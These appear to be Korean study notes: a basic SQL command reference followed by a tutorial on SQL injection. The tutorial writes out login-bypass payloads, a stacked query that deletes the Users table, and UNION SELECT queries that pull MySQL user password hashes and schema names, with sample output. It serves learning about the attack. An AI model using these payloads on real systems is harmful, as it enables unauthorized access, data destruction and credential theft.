# SQL 명령어
0. DESC
    DESC 테이블명; 테이블 정의 보기

1. SELECT 
    SELECT * FROM 테이블명 WHERE 필드1='조건1' AND 필드2='조건2'
    SELECT 필드1, 필드2, 필드3 FROM 테이블명
    SELECT * FROM TAB; 존재하는 모든 테이블 보기.
    SELECT DISTINCT 필드1 FROM 테이블명; 중복 제거하기
    SELECT 필드1 FROM 테이블 WHERE 필드2 BETWEEN 00 AND 00; 00부터 00사이에서
    SELECT 필드1 FROM 테이블 WHERE 필드2 IN(00, 00); 00과 00중에서
    SELECT 필드1 FROM 테이블 WHERE 필드2 LIKE '%단어%'
    SELECT 필드1 FROM 테이블 WHERE 필드2 IS NULL; or NOT IS NULL

2. UPDATE
    UPDATE 테이블명 SET 필드='값', 필드2='값', 필드3='값' WHERE 필드 LIKE '조건'

3. INSERT
    INSERT INTO 테이블명(필드1, 필드2) VALUES ('값', '값')

*. 비교 연산자
    >, >=, <, <=, =, <>(not equal !)

4. DROP 
    DROP TABLE 테이블명;

5. CREATE
    CREATE TABLE 테이블명(
        필드명 타입 조건,
        id varchar2(15) primary KET
    )

6. 주석
--, /* */

--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------

# SQL 인젝션 공격 목적 및 영향
    - SQL 인젝션은 DB에 비정상적인 쿼리가 실행되도록 하여 아래와 같은 목적을 달성하고자 한다.
1. 인증 우회
    - SQL 인젝션 공격의 대표적인 경우로, 로그인 폼(Form)을 대상으로 공격을 수행한다. 정상적인 계정 정보 없이도 로그인을 우회하여 인증을 획득할 수 있다.
2. DB 데이터 조작 및 유출
    - 조작된 쿼리가 실행되도록 하여, 기업의 개인정보나 기밀정보에 접근하여 데이터를 획득할 수 있다. 또한 데이터 값을 변경하거나 심지어 테이블을 몽땅 지워버릴 수 있다.
3. 시스템 명령어 실행
    - 일부 데이터베이스의 경우 확장 프로시저를 호출하여 원격으로 시스템 명령어를 수행할 수 있도록 한다. 시스템 명령어를 실행할 수 있다면 해당 서버의 모든 자원에 접근하고 데이터를 유출, 삭제 할 수 있다는 말이 된다.

--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------

# SQL 인젝션 공격 조건
1. 웹 애플리케이션이 DB와 연동
2. 외부 입력값이 DB 쿼리문으로 사용

--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------

# SQL 인젝션 공격 유형과 공격 기법
1. SQL 인젝션 (Not Blind)
    1). Query 조건 무력화 (Where 구문 우회)
        - Where 구문은 SQL에서 조건을 기술하는 구문이다. Where 조건에 기술된 구문이 '참(true)'이 되는 범위만 쿼리 결과로 반환된다. 
        => 이 Where 조건이 무조건 참이 되도록 쿼리를 조작하여 Where 조건을 우회하게 만든다.
        
        SQL = `Select * FROM Users WHERE userid='입력값1' AND userpw='입력값2'`;
        
        아래의 공격 문을 만들 수 있다.
        [1]. 주석을 이용한 공격
            userid = admin'--
            userpw = 아무거나
        
        => `Select * FROM User WHERE userid='admin'
                        --' AND userpw='아무거나'`;
            '--'로 인해 뒤에 있는 명령어들이 주석 처리가 된다.
            즉, admin의 아이디를 가진 계정이 password가 없어도 로그인이 되는 원리이다.

        [2]. 항상 참이 되도록하여 Where 조건을 무력화 하는 공격
            userid = test
            userpw = 1234' or '1'='1

        => `Select * FROM User WHERE userid='test' AND userpw='1234' or '1'='1'`;
            ' or '1'=1로 인해 userpw가 어떤 값이여도 참이 되어진다. 
        
        [3]. ;(클론)과 주석을 이용하여 여러 명령어를 삽입하는 공격
            userid = admin'; DELETE FROM Users--
            userpw = 아무거나
            
        =>  `Select * FROM User WHERE userid='admin'; DELETE FROM Users-- ' AND userpw = '아무거나';

    2). 고의적으로 에러를 유발시켜 정보를 획득한다.
        기본적으로 웹 애플리케이션은 쿼리 수행 중 오류가 발생하면 DB오류를 그대로 브라우저에 출력한다.

        [외부 입력값]
        userid = test' UNION SELECT 1 --
        userpw = 아무거나

        => `Select * FROM User WHERE userid='test' UNION SELECT 1 --' AND userpw = '아무거나'`;

        테스트용 User 테이블은 4개의 컬럼으로 구성되어 있다.
        UNION은 여러개의 SQL문을 합쳐 하나의 SQL 문으로 만들어주는 명령어이다. 
            칼럼명이 같아야 하며, 칼럼별 데이터타입이 같아야 한다.

            UNION SELECT 1은 1개의 컬럼을 가진 쿼리를 합쳐준다.
            이를 통해 특정 테이블이 몇개의 칼럼을 가졌는지 알 수 있다.


        일반적인 웹 애플리케이션은 쿼리 수행 중 오류가 발생하면 DB 오류를 그대로 브라우저에 전송한다.
        ["UNION, INTERSECT 또는 EXCEPT 연산자를 사용하여 결합된 모든 쿼리의 대상 목록에는 동일한 개수의 식이 있어야 합니다." (SQL Server 기준)]

        mysql> select * from topic union select 1,1,1,1;  
        ERROR 1222 (21000): The used SELECT statements have a different number of columns
        mysql> select * from topic union select 1,1,1,1,1;
        +----+------------+-------------------+---------------------+-----------+
        | id | title      | description       | created             | author_id |
        +----+------------+-------------------+---------------------+-----------+
        |  1 | 123123123  | 41236             | 2018-01-01 12:10:11 |         1 |
        |  2 | 51231      | 412323            | 2018-01-03 13:01:10 |         1 |
        |  3 | 31251      | 412313213         | 2018-01-20 11:01:10 |         3 |
        |  4 | PostgreSQL | PostgreSQL is ... | 2018-01-23 01:03:03 |         3 |
        |  7 | MongoDB    | MongoDB...        | 2020-08-04 06:00:34 |         1 |
        |  8 | 11         | 22                | 2020-08-04 06:00:41 |         1 |
        |  1 | 1          | 1                 | 1                   |         1 |
        +----+------------+-------------------+---------------------+-----------+
        7 rows in set (0.00 sec)
        
        이를 이용하여 Mysql의 비밀번호를 탈취할 수 있다. (5.7 버전 이상. MYSQL)
        select * from topic UNION SELECT user, authentication_string,1,1,1 FROM mysql.user;    
        +------------------+------------------------------------------------------------------------+-------------------+---------------------+-----------+
        | id               | title                                                                  | description       | created             | author_id |
        +------------------+------------------------------------------------------------------------+-------------------+---------------------+-----------+
        | 1                | 123123123                                                              | 41236             | 2018-01-01 12:10:11 |         1 |
        | 2                | 51231                                                                  | 412323            | 2018-01-03 13:01:10 |         1 |
        | 3                | 31251                                                                  | 412313213         | 2018-01-20 11:01:10 |         3 |
        | 4                | PostgreSQL                                                             | PostgreSQL is ... | 2018-01-23 01:03:03 |         3 |
        | 7                | MongoDB                                                                | MongoDB...        | 2020-08-04 06:00:34 |         1 |
        | 8                | 11                                                                     | 22                | 2020-08-04 06:00:41 |         1 |
        | root             | *FD571203974BA9AFE270FE62151AE967ECA5E0AA                              | 1                 | 1                   |         1 |
        +------------------+------------------------------------------------------------------------+-------------------+---------------------+-----------+

        DB명 얻어오기.
        select * from topic UNION SELECT table_schema,1,1,1,1 FROM information_schema.tables;      
        +--------------------+------------+-------------------+---------------------+-----------+
        | id                 | title      | description       | created             | author_id |
        +--------------------+------------+-------------------+---------------------+-----------+
        | 1                  | 123123123  | 41236             | 2018-01-01 12:10:11 |         1 |
        | 2                  | 51231      | 412323            | 2018-01-03 13:01:10 |         1 |
        | 3                  | 31251      | 412313213         | 2018-01-20 11:01:10 |         3 |
        | 4                  | PostgreSQL | PostgreSQL is ... | 2018-01-23 01:03:03 |         3 |
        | 7                  | MongoDB    | MongoDB...        | 2020-08-04 06:00:34 |         1 |
        | 8                  | 11         | 22                | 2020-08-04 06:00:41 |         1 |
        | information_schema | 1          | 1                 | 1                   |         1 |
        | mysql              | 1          | 1                 | 1                   |         1 |
        | opentutorials      | 1          | 1                 | 1                   |         1 |
        | performance_schema | 1          | 1                 | 1                   |         1 |
        | sys                | 1          | 1                 | 1                   |         1 |
        +--------------------+------------+-------------------+---------------------+-----------+       

        테이블명 얻어오기
        select * from topic UNION SELECT table_name,1,1,1,1 FROM information_schema.columns; 

        

